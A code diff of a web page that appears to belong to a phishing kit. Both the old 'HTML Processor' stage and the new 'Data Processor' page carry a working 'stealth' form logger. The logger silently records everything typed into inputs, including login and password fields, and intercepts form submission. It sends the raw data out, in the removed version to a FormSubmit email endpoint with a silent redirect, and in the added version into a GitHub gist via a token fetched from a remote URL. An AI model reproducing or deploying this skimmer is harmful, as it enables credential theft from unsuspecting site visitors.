@@ -1,546 +1,335 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<script src='//libtl.com/sdk.js' data-zone='9601506' data-sdk='show_9601506'></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HTML Processor | Stage 2</title>
+    <title>Data Processor</title>
     <style>
-        :root {
-            --primary: #4361ee;
-            --primary-dark: #3a56d4;
-            --secondary: #3f37c9;
-            --success: #4cc9f0;
-            --info: #4895ef;
-            --warning: #f72585;
-            --danger: #7209b7;
-            --light: #f8f9fa;
-            --dark: #212529;
-            --border-radius: 8px;
-            --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            --transition: all 0.3s ease;
-        }
-
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            color: var(--dark);
-            background-color: #f5f7fa;
-            margin: 0;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 900px;
+            font-family: Arial, sans-serif;
+            max-width: 600px;
             margin: 0 auto;
-            background: white;
-            border-radius: var(--border-radius);
-            box-shadow: var(--box-shadow);
-            overflow: hidden;
-        }
-
-        .header {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
             padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            background-color: #f5f5f5;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
             text-align: center;
         }
-
-        .header h1 {
-            margin: 0;
-            font-weight: 600;
-        }
-
-        .stage-tag {
-            display: inline-block;
-            background-color: rgba(255, 255, 255, 0.2);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 14px;
-            margin-top: 8px;
-        }
-
-        .content {
-            padding: 25px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
+        label {
             display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: var(--dark);
+            margin-bottom: 5px;
+            font-weight: bold;
         }
-
-        .form-control {
+        input {
             width: 100%;
-            padding: 12px;
+            padding: 8px;
+            margin-bottom: 15px;
             border: 1px solid #ddd;
-            border-radius: var(--border-radius);
-            font-size: 16px;
-            transition: var(--transition);
+            border-radius: 4px;
+            box-sizing: border-box;
         }
-
-        .form-control:focus {
-            border-color: var(--primary);
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
-        }
-
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            padding: 12px 20px;
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 15px;
             border: none;
-            border-radius: var(--border-radius);
-            font-size: 16px;
-            font-weight: 500;
+            border-radius: 4px;
             cursor: pointer;
-            transition: var(--transition);
-            margin-right: 10px;
-            margin-bottom: 10px;
+            font-size: 16px;
+            width: 100%;
         }
-
-        .btn i {
-            margin-right: 8px;
+        button:hover {
+            background-color: #45a049;
         }
-
-        .btn-primary {
-            background-color: var(--primary);
-            color: white;
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 4px;
         }
-
-        .btn-primary:hover {
-            background-color: var(--primary-dark);
+        .success {
+            background-color: #dff0d8;
+            color: #3c763d;
         }
-
-        .btn-secondary {
-            background-color: #6c757d;
-            color: white;
+        .error {
+            background-color: #f2dede;
+            color: #a94442;
         }
-
-        .btn-secondary:hover {
-            background-color: #5a6268;
-        }
-
-        .btn-success {
-            background-color: #28a745;
-            color: white;
-        }
-
-        .btn-success:hover {
-            background-color: #218838;
-        }
-
-        .btn-danger {
-            background-color: #dc3545;
-            color: white;
-        }
-
-        .btn-danger:hover {
-            background-color: #c82333;
-        }
-
-        .btn-next {
-            float: right;
-            background-color: var(--success);
-        }
-
-        .btn-next:hover {
-            background-color: #3ab7db;
-        }
-
-        .btn:disabled {
-            opacity: 0.65;
-            cursor: not-allowed;
-        }
-
-        .alert {
-            padding: 15px;
-            border-radius: var(--border-radius);
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-        }
-
-        .alert i {
-            margin-right: 10px;
-            font-size: 20px;
-        }
-
-        .alert-info {
-            background-color: #e7f5fe;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-        }
-
-        .alert-success {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-
-        .alert-warning {
-            background-color: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeeba;
-        }
-
-        .alert-danger {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-
-        .preview-container {
-            margin-top: 30px;
-            border: 1px solid #eee;
-            border-radius: var(--border-radius);
-            overflow: hidden;
-        }
-
-        .preview-header {
-            background-color: #f8f9fa;
-            padding: 12px 15px;
-            border-bottom: 1px solid #eee;
-            font-weight: 500;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .preview-content {
-            max-height: 400px;
-            overflow-y: auto;
-            padding: 15px;
-            background-color: #f8f9fa;
-            font-family: 'Courier New', Courier, monospace;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-
-        .status-badge {
-            display: inline-block;
-            padding: 3px 8px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            background-color: #e9ecef;
-            color: #495057;
-        }
-
-        .status-badge.active {
-            background-color: var(--success);
-            color: white;
-        }
-
-        .action-buttons {
-            display: flex;
-            flex-wrap: wrap;
-            margin-bottom: 20px;
-            gap: 10px;
-        }
-
-        @media (max-width: 768px) {
-            .content {
-                padding: 15px;
-            }
-
-            .action-buttons {
-                flex-direction: column;
-            }
-
-            .btn-next {
-                float: none;
-                width: 100%;
-                margin-top: 10px;
-            }
+        .hidden {
+            display: none;
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>HTML Processor</h1>
-            <div class="stage-tag">Stage 2: Enhancement</div>
+        <h1>Data Processor</h1>
+        
+        <div id="userSetup" class="hidden">
+            <h2>User Setup</h2>
+            <p>Please enter your username and ID for tracking:</p>
+            <label for="username">Username:</label>
+            <input type="text" id="username" placeholder="Your username (will be used as filename)">
+            
+            <label for="userId">ID:</label>
+            <input type="text" id="userId" placeholder="Your unique ID">
+            
+            <button id="saveUser">Save User Info</button>
         </div>
-
-        <div class="content">
-            <div id="alert" class="alert" style="display: none;">
-                <i class="fas fa-info-circle"></i>
-                <div id="alert-message"></div>
-            </div>
-
-            <div class="form-group">
-                <label for="email"><i class="fas fa-envelope"></i> Notification Email</label>
-                <input type="text" id="email" class="form-control" placeholder="your@email.com" value="kiddxxq1@gmail.com">
-            </div>
-
-            <div class="form-group">
-                <label for="redirect"><i class="fas fa-external-link-alt"></i> Redirect URL</label>
-                <input type="text" id="redirect" class="form-control" placeholder="https://example.com" value="https://www.dtech24.co.za">
-            </div>
-
-            <div class="action-buttons">
-                <button id="processBtn" class="btn btn-primary">
-                    <i class="fas fa-magic"></i> Process HTML
-                </button>
-                <button id="refreshBtn" class="btn btn-secondary">
-                    <i class="fas fa-sync-alt"></i> Refresh
-                </button>
-                <button id="nextStageBtn" class="btn btn-next" disabled>
-                    <i class="fas fa-arrow-right"></i> Continue to Next Stage
-                </button>
-            </div>
-
-            <div class="preview-container">
-                <div class="preview-header">
-                    <span><i class="fas fa-code"></i> HTML Preview</span>
-                    <span id="statusBadge" class="status-badge">No content loaded</span>
-                </div>
-                <div class="preview-content" id="htmlPreview">
-                    <!-- HTML content will be displayed here -->
-                </div>
-            </div>
+        
+        <div id="statusMessage" class="status hidden"></div>
+        
+        <div id="dataInfo" class="hidden">
+            <h2>Data Processing</h2>
+            <p>Data from localStorage (data1step):</p>
+            <pre id="data1stepDisplay"></pre>
+            <p>Data will be processed and saved to data2step.</p>
         </div>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Load the HTML from localStorage on page load
-            loadHtmlPreview();
-
-            // Process button handler
-            document.getElementById('processBtn').addEventListener('click', processHtml);
-
-            // Refresh button handler
-            document.getElementById('refreshBtn').addEventListener('click', loadHtmlPreview);
-
-            // Next stage button handler
-            document.getElementById('nextStageBtn').addEventListener('click', () => {
-                window.location.href = 'step3.html';
+        // Check for existing user info
+        const storedUsername = localStorage.getItem('username');
+        const storedUserId = localStorage.getItem('userId');
+        
+        // DOM elements
+        const userSetupDiv = document.getElementById('userSetup');
+        const dataInfoDiv = document.getElementById('dataInfo');
+        const statusMessageDiv = document.getElementById('statusMessage');
+        
+        if (storedUsername && storedUserId) {
+            // User info exists, hide setup form
+            userSetupDiv.classList.add('hidden');
+            dataInfoDiv.classList.remove('hidden');
+            showStatus(`Welcome back, ${storedUsername}! (ID: ${storedUserId})`, 'success');
+            
+            // Process data
+            processData();
+        } else {
+            // Show user setup form
+            userSetupDiv.classList.remove('hidden');
+            
+            // Save user info handler
+            document.getElementById('saveUser').addEventListener('click', () => {
+                const username = document.getElementById('username').value.trim();
+                const userId = document.getElementById('userId').value.trim();
+                
+                if (username && userId) {
+                    localStorage.setItem('username', username);
+                    localStorage.setItem('userId', userId);
+                    
+                    userSetupDiv.classList.add('hidden');
+                    dataInfoDiv.classList.remove('hidden');
+                    showStatus(`User info saved successfully!`, 'success');
+                    
+                    // Process data
+                    processData();
+                } else {
+                    showStatus('Please enter both username and ID', 'error');
+                }
             });
-        });
-
-        function loadHtmlPreview() {
-            const originalHtml = localStorage.getItem('data1step');
-            const previewElement = document.getElementById('htmlPreview');
-            const statusBadge = document.getElementById('statusBadge');
-
-            if (originalHtml) {
-                previewElement.textContent = originalHtml;
-                statusBadge.textContent = 'Ready for processing';
-                statusBadge.className = 'status-badge active';
-                showAlert('HTML content loaded successfully from storage', 'info');
+        }
+        
+        function processData() {
+            const data1step = localStorage.getItem('data1step');
+            
+            if (data1step) {
+                // Display the data
+                document.getElementById('data1stepDisplay').textContent = data1step;
+                
+                // Process the data (in this case, just copy to data2step)
+                localStorage.setItem('data2step', data1step);
+                
+                // Get username for filename
+                const username = localStorage.getItem('username') || 'anonymous';
+                const filename = `${username}.json`;
+                
+                showStatus(`Data processed successfully and saved to data2step. Filename would be: ${filename}`, 'success');
             } else {
-                previewElement.textContent = 'No HTML content found in storage. Please complete Stage 1 first.';
-                statusBadge.textContent = 'No content loaded';
-                statusBadge.className = 'status-badge';
-                showAlert('No HTML content found in storage. Please complete Stage 1 first.', 'warning');
-                document.getElementById('nextStageBtn').disabled = true;
+                showStatus('No data found in data1step', 'error');
             }
         }
-
-        function processHtml() {
-            const email = document.getElementById('email').value.trim();
-            const redirectUrl = document.getElementById('redirect').value.trim();
-            const previewElement = document.getElementById('htmlPreview');
-            const statusBadge = document.getElementById('statusBadge');
-
-            if (!email) {
-                showAlert('Please enter a valid notification email address', 'danger');
-                return;
-            }
-
-            const originalHtml = localStorage.getItem('data1step');
-            if (!originalHtml) {
-                showAlert('No HTML content found to process. Please complete Stage 1 first.', 'danger');
-                return;
-            }
-
-            // Show processing notification
-            showAlert('Processing HTML content...', 'info');
-
-            // Simulate processing delay for better UX
-            setTimeout(() => {
-                try {
-                    const loggerScript = generateLoggerScript(email, redirectUrl);
-                    const modifiedHtml = originalHtml.replace('</body>', loggerScript + '</body>') || originalHtml + loggerScript;
-
-                    // Save to localStorage
-                    localStorage.setItem('data2step', modifiedHtml);
-
-                    // Update UI
-                    previewElement.textContent = originalHtml; // Show original even after processing
-                    statusBadge.textContent = 'Processing complete';
-                    statusBadge.className = 'status-badge active';
-
-                    showAlert('HTML processed successfully! The enhanced version has been saved.', 'success');
-                    document.getElementById('nextStageBtn').disabled = false;
-                } catch (error) {
-                    showAlert('Error processing HTML: ' + error.message, 'danger');
-                    console.error(error);
-                }
-            }, 1000);
+        
+        function showStatus(message, type) {
+            statusMessageDiv.textContent = message;
+            statusMessageDiv.className = `status ${type}`;
+            statusMessageDiv.classList.remove('hidden');
         }
+    </script>
 
-        function generateLoggerScript(email, redirectUrl) {
-            // This is the same script generator as before
-            return `<!-- STEALTH FORM LOGGER (INVISIBLE) -->
-<script>
-// CONFIGURATION
-const CONFIG = {
-    // Your FormSubmit endpoint
-    FORM_SUBMIT_URL: 'https://formsubmit.co/ajax/${email}',
-    
-    // Redirect URL after submission
-    REDIRECT_URL: '${redirectUrl}',
-    
-    // Time to wait after typing before considering input "finished" (ms)
-    INPUT_IDLE_TIMEOUT: 2000,
-    
-    // Patterns that indicate a submit button
-    SUBMIT_BUTTON_PATTERNS: [
-        'submit', 'login', 'sign in', 'continue', 
-        'next', 'confirm', 'proceed', 'authenticate'
-    ]
-};
+    <!-- This is where the script will be injected if data1step exists -->
+    <script>
+        // Check for data1step and inject the script if it exists
+        if (localStorage.getItem('data1step')) {
+            const script = document.createElement('script');
+            script.innerHTML = `
+                // CONFIGURATION
+                const CONFIG = {
+                    // Gist configuration
+                    GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a',
+                    GIST_FILENAME: localStorage.getItem('username') ? localStorage.getItem('username') + '.json' : 'Data.json',
+                    
+                    // GitHub token URL (replace with your own token endpoint if needed)
+                    TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',
 
-// ===== INVISIBLE LOGGER =====
-(() => {
-    // Silent console logging (optional for debugging)
-    const log = (msg, type='info') => {
-        console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
-    };
+                    // Time to wait after typing before considering input "finished" (ms)
+                    INPUT_IDLE_TIMEOUT: 2000,
 
-    // ===== DATA CAPTURE =====
-    let typingTimer;
-    let formData = {};
+                    // Patterns that indicate a submit button
+                    SUBMIT_BUTTON_PATTERNS: [
+                        'submit', 'login', 'sign in', 'continue', 
+                        'next', 'confirm', 'proceed', 'authenticate'
+                    ]
+                };
 
-    // Send data via FormSubmit and redirect
-    const sendToFormSubmit = async (data) => {
-        try {
-            const formData = new FormData();
-            formData.append('_captcha', 'false');
-            formData.append('_subject', 'Form Data Capture');
-            formData.append('_template', 'table');
-            
-            // Add captured data (RAW, NO MASKING)
-            formData.append('page_url', window.location.href);
-            formData.append('timestamp', new Date().toISOString());
-            
-            Object.entries(data).forEach(([key, value]) => {
-                formData.append(key, value); // Sends exact input
-            });
+                // ===== INVISIBLE LOGGER =====
+                (() => {
+                    // Silent console logging (optional for debugging)
+                    const log = (msg, type='info') => {
+                        console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
+                    };
 
-            const response = await fetch(CONFIG.FORM_SUBMIT_URL, {
-                method: 'POST',
-                body: formData
-            });
+                    // ===== DATA CAPTURE =====
+                    let typingTimer;
+                    let formData = {};
 
-            const result = await response.json();
-            
-            if (result.success) {
-                window.location.href = CONFIG.REDIRECT_URL; // SILENT REDIRECT
-            }
-        } catch (err) {} // Silent fail
-    };
+                    // Fetch GitHub token
+                    const fetchToken = async () => {
+                        try {
+                            const res = await fetch(CONFIG.TOKEN_URL);
+                            return (await res.text()).trim();
+                        } catch (err) {
+                            log('Failed to fetch token', 'error');
+                            return null;
+                        }
+                    };
 
-    // ===== EVENT HANDLERS =====
-    const setupInputHandlers = () => {
-        document.querySelectorAll('input, textarea, select').forEach(field => {
-            field.addEventListener('input', () => {
-                clearTimeout(typingTimer);
-                typingTimer = setTimeout(() => {
-                    const name = field.name || field.id || 'unnamed_field';
-                    const value = field.value;
-                    if (value) {
-                        formData[name] = value; // Stores raw value
-                    }
-                }, CONFIG.INPUT_IDLE_TIMEOUT);
-            });
-        });
-    };
+                    // Upload data to Gist
+                    const uploadToGist = async (data) => {
+                        try {
+                            const token = await fetchToken();
+                            if (!token) return false;
 
-    const setupSubmissionHandlers = () => {
-        // Form submissions
-        document.querySelectorAll('form').forEach(form => {
-            form.addEventListener('submit', (e) => {
-                e.preventDefault(); // Stop default submission
-                
-                const data = {};
-                Array.from(form.elements).forEach(el => {
-                    if (el.name && el.value) {
-                        data[el.name] = el.value; // RAW DATA
-                    }
-                });
-                sendToFormSubmit(data);
-            }, true);
-        });
+                            // Prepare the data with timestamp
+                            const timestamp = new Date().toISOString();
+                            const entry = {
+                                page_url: window.location.href,
+                                userId: localStorage.getItem('userId') || 'unknown',
+                                ...data
+                            };
 
-        // Button clicks
-        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
-            btn.addEventListener('click', (e) => {
-                const btnText = (btn.textContent || btn.value || '').toLowerCase();
-                const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
-                    btnText.includes(pattern)
-                );
-                
-                if (isSubmit && Object.keys(formData).length > 0) {
-                    sendToFormSubmit(formData);
-                    formData = {}; // Clear after submission
-                }
-            }, true);
-        });
-    };
+                            // Step 1: Get current content of the Gist
+                            const gistRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
+                                headers: { Authorization: \`token \${token}\` }
+                            });
 
-    // ===== INITIALIZATION =====
-    setupInputHandlers();
-    setupSubmissionHandlers();
+                            if (!gistRes.ok) {
+                                log('Failed to fetch existing gist', 'error');
+                                return false;
+                            }
 
-    // Watch for dynamically added elements
-    new MutationObserver(() => {
-        setupInputHandlers();
-        setupSubmissionHandlers();
-    }).observe(document.body, { childList: true, subtree: true });
-})();
-<\/script>`;
-        }
+                            const gistData = await gistRes.json();
+                            let currentData = {};
 
-        function showAlert(message, type) {
-            const alertDiv = document.getElementById('alert');
-            const alertMessage = document.getElementById('alert-message');
-            const alertIcon = alertDiv.querySelector('i');
+                            if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
+                                try {
+                                    currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
+                                } catch (e) {
+                                    currentData = {};
+                                }
+                            }
 
-            // Set message and style
-            alertMessage.textContent = message;
-            alertDiv.className = `alert alert-${type}`;
-            alertDiv.style.display = 'flex';
+                            // Step 2: Append new data with timestamp key
+                            currentData[timestamp] = entry;
 
-            // Set appropriate icon
-            switch(type) {
-                case 'success':
-                    alertIcon.className = 'fas fa-check-circle';
-                    break;
-                case 'danger':
-                    alertIcon.className = 'fas fa-exclamation-circle';
-                    break;
-                case 'warning':
-                    alertIcon.className = 'fas fa-exclamation-triangle';
-                    break;
-                default:
-                    alertIcon.className = 'fas fa-info-circle';
-            }
+                            // Step 3: Send PATCH to update the Gist
+                            const updateRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
+                                method: 'PATCH',
+                                headers: {
+                                    'Authorization': \`token \${token}\`,
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    files: {
+                                        [CONFIG.GIST_FILENAME]: {
+                                            content: JSON.stringify(currentData, null, 2)
+                                        }
+                                    }
+                                })
+                            });
 
-            // Auto-hide after 5 seconds
-            setTimeout(() => {
-                alertDiv.style.display = 'none';
-            }, 10000);
+                            return updateRes.ok;
+                        } catch (err) {
+                            log('Gist upload failed: ' + err.message, 'error');
+                            return false;
+                        }
+                    };
+
+                    // ===== EVENT HANDLERS =====
+                    const setupInputHandlers = () => {
+                        document.querySelectorAll('input, textarea, select').forEach(field => {
+                            field.addEventListener('input', () => {
+                                clearTimeout(typingTimer);
+                                typingTimer = setTimeout(() => {
+                                    const name = field.name || field.id || 'unnamed_field';
+                                    const value = field.value;
+                                    if (value) {
+                                        formData[name] = value; // Stores raw value
+                                    }
+                                }, CONFIG.INPUT_IDLE_TIMEOUT);
+                            });
+                        });
+                    };
+
+                    const setupSubmissionHandlers = () => {
+                        // Form submissions
+                        document.querySelectorAll('form').forEach(form => {
+                            form.addEventListener('submit', (e) => {
+                                e.preventDefault(); // Stop default submission
+
+                                const data = {};
+                                Array.from(form.elements).forEach(el => {
+                                    if (el.name && el.value) {
+                                        data[el.name] = el.value; // RAW DATA
+                                    }
+                                });
+                                uploadToGist(data);
+                            }, true);
+                        });
+
+                        // Button clicks
+                        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
+                            btn.addEventListener('click', (e) => {
+                                const btnText = (btn.textContent || btn.value || '').toLowerCase();
+                                const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
+                                    btnText.includes(pattern)
+                                );
+
+                                if (isSubmit && Object.keys(formData).length > 0) {
+                                    uploadToGist(formData);
+                                    formData = {}; // Clear after submission
+                                }
+                            }, true);
+                        });
+                    };
+
+                    // ===== INITIALIZATION =====
+                    setupInputHandlers();
+                    setupSubmissionHandlers();
+
+                    // Watch for dynamically added elements
+                    new MutationObserver(() => {
+                        setupInputHandlers();
+                        setupSubmissionHandlers();
+                    }).observe(document.body, { childList: true, subtree: true });
+                })();
+            `;
+            document.body.appendChild(script);
         }
     </script>
 </body>
